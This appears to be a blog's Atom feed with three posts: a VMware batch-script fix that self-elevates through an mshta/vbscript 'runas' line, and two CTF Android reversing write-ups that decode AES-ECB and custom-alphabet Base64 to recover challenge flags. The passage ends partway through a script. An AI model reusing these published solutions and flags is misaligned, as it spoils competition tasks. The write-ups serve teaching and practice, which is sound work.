<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ss1du0us&#39;s Blog</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://www.4ss1du0us.cn/atom.xml" rel="self"/>
  
  <link href="https://www.4ss1du0us.cn/"/>
  <updated>2023-04-14T09:11:44.273Z</updated>
  <id>https://www.4ss1du0us.cn/</id>
  
  <author>
    <name>4ss1du0us</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VM虚拟机显示“未能开启xxx.vmx”的解决办法</title>
    <link href="https://www.4ss1du0us.cn/2023/04/11/%E6%97%A5%E5%B8%B8/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E7%A4%BA%E2%80%9C%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AFxxx.vmx%E2%80%9D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>https://www.4ss1du0us.cn/2023/04/11/%E6%97%A5%E5%B8%B8/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%98%BE%E7%A4%BA%E2%80%9C%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AFxxx.vmx%E2%80%9D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</id>
    <published>2023-04-11T13:36:24.000Z</published>
    <updated>2023-04-14T09:11:44.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>最近有时候打开 VM 虚拟机时，会弹出：<code>未能开启&quot;xxx(虚拟机路径)\xxx(虚拟机名).vmx&quot;</code> 的警告，导致虚拟机无法正常开机</p></blockquote><p><img src="https://s2.loli.net/2023/04/11/kADdNj5BGg6MRUJ.png" alt="VM虚拟机未能开启解决办法1.png"></p><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>产生原因是 VMware 的服务出现问题，需要重新启动服务，VM 即可恢复正常</p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="手动修改"><a href="#手动修改" class="headerlink" title="手动修改"></a>手动修改</h3><ol><li><p>打开服务，可先通过 <code>ctrl + alt + delete</code> 打开任务管理器，在左侧栏选中服务<br><img src="https://s2.loli.net/2023/04/11/CujAOlwSoQGndIM.png" alt="VM虚拟机未能开启解决办法2.png"></p></li><li><p>往下翻，找到名称为 <code>VMAuthdService</code> 的服务</p></li><li><p>右键，重新启动<br><img src="https://s2.loli.net/2023/04/11/RWkXZafwSqsObcD.png" alt="VM虚拟机未能开启解决办法3.png"></p></li><li><p>再次打开 VM 中的虚拟机，发现问题解决，不会报错了</p></li></ol><hr><h3 id="脚本修改"><a href="#脚本修改" class="headerlink" title="脚本修改"></a>脚本修改</h3><blockquote><p>每次都手动去重新启动服务未免太麻烦，这里利用脚本自动重启</p></blockquote><ol><li><p>首先新建一个 txt 文本文件，例如：VM.txt</p></li><li><p>写入如下内容：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">@echo offecho  关闭服务   net stop <span class="token string">"VMAuthdService"</span>echo  开启服务       net start <span class="token string">"VMAuthdService"</span>pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将 VM.txt 另存为，格式选择 <code>ANSI</code>（<em>不然的话 cmd 里会出现中文乱码</em>）<br><img src="https://s2.loli.net/2023/04/11/YCAGiwafoWP2LSh.png" alt="VM虚拟机未能开启解决办法4.png"></p></li><li><p>但是这样的话，运行会出错，因为需要有管理员权限</p></li><li><p>在 VM.txt 最前面加上一段代码：（<em>这段代码用来调用管理员权限</em>）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">@echo off<span class="token operator">%</span><span class="token number">1</span> mshta vbscript<span class="token operator">:</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>exitcd <span class="token operator">/</span>d <span class="token string">"%~dp0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>所以，最终代码应该是这样的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">@echo off<span class="token operator">%</span><span class="token number">1</span> mshta vbscript<span class="token operator">:</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ShellExecute</span><span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c %~s0 ::"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"runas"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>exitcd <span class="token operator">/</span>d <span class="token string">"%~dp0"</span>@echo offecho  关闭服务   net stop <span class="token string">"VMAuthdService"</span>echo  开启服务       net start <span class="token string">"VMAuthdService"</span>pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将 <code>VM.txt</code> 重命名为 <code>VM.bat</code>，双击即可运行：（<em>会自动跳出询问管理员权限的窗口，点击 “是” 即可</em>）<br><img src="https://s2.loli.net/2023/04/11/qTjEwzJ1VLhOk23.png" alt="VM虚拟机未能开启解决办法5.png"></p></li><li><p>以后 VM 再出现这个报错，直接双击 <code>VM.bat</code> 即可</p></li></ol>]]></content>
    
    
    <summary type="html">打开 VMware 虚拟机时突然显示 “未能开启 xxx.vmx” 的解决办法</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>湖北省第七届楚慧杯-Level_up</title>
    <link href="https://www.4ss1du0us.cn/2023/03/31/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up/"/>
    <id>https://www.4ss1du0us.cn/2023/03/31/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up/</id>
    <published>2023-03-31T14:43:39.000Z</published>
    <updated>2023-04-14T09:01:04.500Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>当给出的 apk 中缺失某个关键函数时，有可能藏在源文件里头，并没有打包到 apk 中</mark></p></li><li><p>涉及到 AES 编码时，例如 <mark>AES128 的解密用到字节编码，最好是使用 python 脚本进行解密</mark></p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）湖北省第七届楚慧杯-Level_up</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载解压得到 chall 文件夹：<br><img src="https://s2.loli.net/2023/03/31/obLZrSqEaC5VXyw.png" alt="湖北省第七届楚慧杯-Level_up1.png"></p><p>注意文件夹里的内容，<code>chall.apk</code> 是打包好的安卓程序，<code>chall</code> 是 <code>chall.apk</code> 的源文件，<code>chall.apk.cache</code> 是缓存文件（具体干什么用的不太清楚）</p></li><li><p>用 jadx-gui 打开 chall.apk，定位到 <code>MainActivity</code><br><img src="https://s2.loli.net/2023/03/31/HZwzfCWhduXvjNs.png" alt="湖北省第七届楚慧杯-Level_up2.png"><br>注意到关键判断语句：<br><img src="https://s2.loli.net/2023/03/31/CGex3bQrcHVNMZg.png" alt="湖北省第七届楚慧杯-Level_up3.png"><br>将用户的输入、用户输入的长度作为参数，经过 <code>check()</code> 函数进行处理，如果校验成功就显示 right!!!</p></li><li><p>点击 <code>check()</code> 函数，发现程序里只有 <code>check()</code> 函数的声明，却没有函数的内容：<br><img src="https://s2.loli.net/2023/03/31/ItB72abQPwEjunM.png" alt="湖北省第七届楚慧杯-Level_up4.png"><br>在程序中搜索 check 关键字依然一无所获</p></li><li><p>然后比赛的时候进行到这里，我就一直卡在从程序中寻找 <code>check()</code> 函数的逻辑 【有一部分原因可能也是受了前面一道题 <code>Level_One</code> 的影响，以为校验逻辑就在程序里】</p></li></ol><blockquote><p>后来看了其他队伍【丝绒Velvet】的 Writeup 我才恍然大悟<br><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDkyOTgxMg==&mid=2247483701&idx=1&sn=df4e34e48671c9edf3372308df7f1269&chksm=cec80acef9bf83d83a938775e57b55c948428c0849a15c5ec0ca420ae5bad03dc58683c0dcc6&mpshare=1&scene=23&srcid=0330grQBOEkM9P3KELybR5rm&sharer_sharetime=1680167468020&sharer_shareid=bd8cb5598a8e94f9f2d58edb9b65a190#rd">2023湖北省第七届“楚慧杯”网络空间安全实践能力竞赛-预赛 -丝绒WP</a><br>   既然程序里没有这个函数，有没有可能是出题人故意在编译程序时把这个函数的内容给删了，所以 apk 文件里没有<br>   现在想想才知道为什么题目还给出了一个源文件夹 chall</p></blockquote><ol start="5"><li><p>在 <code>chall</code> 文件夹内查看：<br><img src="https://s2.loli.net/2023/03/31/9NWDIgVPHGzwlix.png" alt="湖北省第七届楚慧杯-Level_up5.png"><br><mark>通过与 jadx-gui 反编译出来的内容进行比对，发现后面这几个文件都是在程序中存在的<br>只有这个 lib 文件夹中的内容在程序中没有包含</mark></p></li><li><p>查看 <code>lib</code> 的内容：<br><img src="https://s2.loli.net/2023/03/31/ZLM8ECVwWcNreSK.png" alt="湖北省第七届楚慧杯-Level_up6.png"><br>发现这四个文件夹里各有一个文件名为 <code>libmobile2.so</code> 的文件<br><img src="https://s2.loli.net/2023/03/31/QFDCo4rXl9BsYv8.png" alt="湖北省第七届楚慧杯-Level_up7.png"><br>但是在第一个文件 <code>arm64-v8a</code> 内，是这样的：<br><img src="https://s2.loli.net/2023/04/01/k1pwrPZCdKLNIAM.png" alt="湖北省第七届楚慧杯-Level_up8.png"><br>注意到除 <code>libmobile2.so</code> 外其他文件的后缀，<code>.id0</code>、<code>.id1</code>、<code>.id2</code> 这不就是 IDA 留下的数据库文件吗<br>在 exeinfo PE 中看看：<br><img src="https://s2.loli.net/2023/04/01/ynMVQOGhwIX1aRA.png" alt="湖北省第七届楚慧杯-Level_up9.png"><br>64 位 elf 文件，用 IDA 打开，选择直接打开现存的数据库文件：<br>在函数中搜索 <code>main</code>，定位到主函数<br><img src="https://s2.loli.net/2023/04/01/9LbTBqpQNW8MdEc.png" alt="湖北省第七届楚慧杯-Level_up10.png"><br>查看一下字符串，<code>shift + F12</code>，发现端倪：<br><img src="https://s2.loli.net/2023/04/01/qzMK6RLCUIfoaiP.png" alt="湖北省第七届楚慧杯-Level_up11.png"><br>跟进 <code>gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc</code> 所在地址：<br><img src="https://s2.loli.net/2023/04/01/9hKndwE1F8u2k3P.png" alt="湖北省第七届楚慧杯-Level_up12.png"><br>发现他们定义在 <code>start()</code> 函数中<br>根据形式，函数 <code>std::string::basic_string&lt;decltype(nullptr)&gt;</code> 应该是字符串复制操作<br><code>key = &quot;followyourheart!&quot;</code><br><code>enc = &quot;gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc&quot;</code><br>得到了 main() 函数中的密文 <code>enc</code>，还得到了一个 <code>key</code> 应该是某种加密的密钥<br>同时，还注意到字符串中有 Base64 加密的码表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code><br>但是 Base64 本身是不需要密钥的，猜测可能有多种加密方法</p></li><li><p>继续审计 main() 函数：<br>很明显注意到这里有一个加密函数：<br><img src="https://s2.loli.net/2023/04/01/tvW4k3pRlGgsOfC.png" alt="湖北省第七届楚慧杯-Level_up13.png"><br>跟进，到 <code>encode()</code> 函数：<br><img src="https://s2.loli.net/2023/04/01/DGA7gqtByUVOsn9.png" alt="湖北省第七届楚慧杯-Level_up14.png"><br>加密方式已经告知了，一个 AES128，一个 Base64，结合前面观察到的字符串，大体已经可以确定了</p></li><li><p><mark>由于在 main() 函数中，发现 <code>cipher::Encrypt::encode()</code> 之后虽然有一大堆代码，但是并没有改变 <code>enc</code> 的值</mark><br>根据代码的意思，加密流程是先对明文进行 <code>AES128（ECB）</code> 加密（密钥是 <code>followyourheart!</code>），然后进行 <code>Base64</code> 加密，得到密文 <code>enc</code><br>因此先对 <code>enc</code> 进行 <code>Base64</code> 解码，然后进行 <code>AES128（ECB）</code> 解码，即可得到 flag</p></li><li><p>但是注意，<code>AES128</code> 是按照 16字节（128 bit）为一组进行加密，所以这里要对字节进行操作，使用普通的在线网站进行解密是不行的，例如：<br><img src="https://s2.loli.net/2023/04/01/gXs7iL9RIbArUBC.png" alt="湖北省第七届楚慧杯-Level_up15.png"></p></li><li><p>因此，利用 python 脚本进行解码</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64  <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES    enc <span class="token operator">=</span> <span class="token string">b'gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc'</span>  key <span class="token operator">=</span> <span class="token string">b'followyourheart!'</span>    string1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>  <span class="token comment"># 先对enc进行Base64解密  </span>  string2 <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>  <span class="token comment"># 创建一个AES对象string2，根据题意是ECB加密模式  </span>flag <span class="token operator">=</span> string2<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>string1<span class="token punctuation">)</span>  <span class="token comment"># AES128 ECB解密  </span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{6b1df900-1284-11ed-9fa7-5405dbe5e745}</p></blockquote><p><img src="https://s2.loli.net/2023/04/01/PN6AYi8G2zBoVL7.png" alt="湖北省第七届楚慧杯-Level_up16.png"></p>]]></content>
    
    
    <summary type="html">一道 200 分的安卓逆向，apk 里面没有加密的函数 check，比赛时害得我找了好久都找不到，后来看其他队伍的 WP 才发现还藏了个 so 文件，真是不细心啊，很好的一道题</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>湖北省第七届楚慧杯-Level_One</title>
    <link href="https://www.4ss1du0us.cn/2023/03/30/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One/"/>
    <id>https://www.4ss1du0us.cn/2023/03/30/CTF%20-%20Reverse_Writeup/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One/</id>
    <published>2023-03-30T08:35:24.000Z</published>
    <updated>2023-04-14T09:00:42.526Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>安卓逆向如何获取数据资源</mark></p></li><li><p><mark>更换码表的 Base64</mark> 加解密</p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）湖北省第七届楚慧杯-Level_One</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载解压得到一个 chall.apk 文件<br><img src="https://s2.loli.net/2023/03/30/tdgwkYnR6A4Jeq9.png" alt="2022第七届楚慧杯-Level_One1.png"><br>界面是常规的输入 flag 然后进行校验，没什么特别的</p></li><li><p>在 jadx-gui 中打开，找到 <code>MainActivity</code>：<br><img src="https://s2.loli.net/2023/03/30/74TvB9dUx6ONicj.png" alt="2022第七届楚慧杯-Level_One2.png"></p></li><li><p>定位到关键判断语句：<br><img src="https://s2.loli.net/2023/03/30/rGkJRD9g3fFNBe4.png" alt="2022第七届楚慧杯-Level_One3.png"></p></li><li><p>获取用户输入，并转化为 utf-8 编码，以字节形式调用 <code>Encrypt()</code> 函数进行加密，然后与 <code>C0535R.string.enc</code> 进行比较，如果相同则获得 flag</p></li><li><p><code>Encrypt()</code> 函数的内容在下方给出：<br><img src="https://s2.loli.net/2023/03/30/YbdJGi2gXl3H5sA.png" alt="2022第七届楚慧杯-Level_One4.png"></p></li><li><p>形式看起来比较复杂，但是可以注意到代码后面一段：<br><img src="https://s2.loli.net/2023/03/30/wUqIcAZ5zoHMsyp.png" alt="2022第七届楚慧杯-Level_One5.png"><br>这里对 <code>bArr</code> 的长度做了一个余 3 的操作，余数为 <code>length2</code><br>并且，还对余数的两种情况分别进行了讨论：<br>当 <code>length2 = 1</code> 时，会在最后添加 <code>&quot;%&amp;&quot;</code><br>当 <code>length2 = 2</code> 时，会在最后添加 <code>&quot;*&quot;</code><br>同时，java 中 <code>charAt()</code> 方法用于返回字符串中指定索引位置的字符，这里利用 <code>append()</code> 向 <code>sb</code> 插入索引处的值<br>这样的特点非常类似 Base64 加密算法，但是不同的是：<br>这里根据余数为 <code>1</code> 或 <code>2</code> 添加的不是 <code>&quot;==&quot;</code> 和 <code>&quot;=&quot;</code></p></li><li><p>继续观察，可以发现 <code>append()</code> 插入用到的索引表 <code>string</code> 来自 <code>C0535R.string.table</code><br><img src="https://s2.loli.net/2023/03/30/4mT6ZNh3yEqJSDL.png" alt="2022第七届楚慧杯-Level_One6.png"></p></li><li><p>在资源中定位这个文件：<br><img src="https://s2.loli.net/2023/03/30/XFeruybMvQo3HxW.png" alt="2022第七届楚慧杯-Level_One7.png"><br>可以得到表中的内容：<code>n4/Xv90ElB32S6MmyK+iVIgkjU17CDGaLYxeuzsc8TqNOtrJWPfRp=HFhAwdb5oZQ</code><br>包含大写字母、小写字母、数字 0-9、<code>&#39;+&#39;</code>、<code>&#39;/&#39;</code>，很符合 Base64 码表的形式，只是原始码表的顺序被打乱了<br>但是根据这里码表的变动，且多出一个 <code>&#39;=&#39;</code>，导致 <code>Encrypt()</code> 函数中最后根据余数个数添加的不是 <code>&#39;==&#39;</code> 和 <code>&#39;=&#39;</code>，也就基本可以确定 <code>Encrypt()</code> 函数是更换过码表的 Base64 加密了</p></li><li><p>在资源里找到 if 条件中对比的数据 <code>C0535R.string.enc</code>：<br><img src="https://s2.loli.net/2023/03/30/f47O5mireX16KMF.png" alt="2022第七届楚慧杯-Level_One8.png"><br>得到 <code>enc</code> 的内容：<code>UsPYUFORMXnHSXIe6xpFSilR2iKs6RvtjeVFSfpHSX9zM0Sp6XVFjeK5</code></p></li><li><p>利用更换码表的 Base64 解密即可（<strong>脚本在便捷算法里有总结</strong>）</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">## coding:utf-8</span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment">## 原始码表</span><span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 不够三倍数，需补齐的次数</span>    nums <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        <span class="token comment">## 每次取三个字符的二进制</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 将三个8字节的二进制转换为4个十进制</span>        temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">## print(temp_str_list)</span>        <span class="token keyword">if</span> nums<span class="token punctuation">:</span>            temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 补足8位字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>        <span class="token comment">## 将四个6字节的二进制转换为三个字符</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span 